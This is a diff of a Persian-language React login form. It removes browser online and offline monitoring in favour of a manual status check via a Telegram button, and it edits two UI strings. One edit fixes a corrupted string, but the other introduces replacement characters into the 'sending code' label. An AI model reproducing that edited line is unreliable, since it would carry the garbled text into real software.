@@ -97,38 +97,7 @@ export const LoginForm = () => {
 
   // Real-time presence tracking completely removed - only manual status check via Telegram button
 
-  // Network status tracking for better offline detection
-  useEffect(() => {
-    const handleOnline = () => {
-      console.log("🌐 Browser reports network came online");
-      // Trigger a status check to verify actual connectivity
-      if (sessionId) {
-        setTimeout(() => {
-          console.log("🔍 Auto-checking network status after online event");
-          checkNetworkStatus().then((status) => {
-            console.log("📊 Auto network check result:", status);
-          });
-        }, 1000);
-      }
-    };
-
-    const handleOffline = () => {
-      console.log("🌐 Browser reports network went offline");
-      // Force offline status if we have an active session
-      if (sessionId) {
-        const offlineStatus = enhancedOfflineDetection.forceOffline();
-        console.log("🔴 Forced offline status:", offlineStatus);
-      }
-    };
-
-    window.addEventListener('online', handleOnline);
-    window.addEventListener('offline', handleOffline);
-
-    return () => {
-      window.removeEventListener('online', handleOnline);
-      window.removeEventListener('offline', handleOffline);
-    };
-  }, [sessionId]);
+  // No automatic network monitoring - only manual status check via Telegram button
 
   // Register callback handler for admin actions
   useEffect(() => {
@@ -1324,7 +1293,7 @@ export const LoginForm = () => {
                       userSelect: "none",
                     }}
                   >
-                    کد د��وت دارید؟
+                    کد دعوت دارید؟
                   </span>
                 </button>
 
@@ -3325,7 +3294,7 @@ export const LoginForm = () => {
                             animation: "spin 1s linear infinite",
                           }}
                         />
-                        <span>در حال ارسال کد...</span>
+                        <span>در حال ار��ال کد...</span>
                       </div>
                     ) : (
                       "ارسال کد تایید"
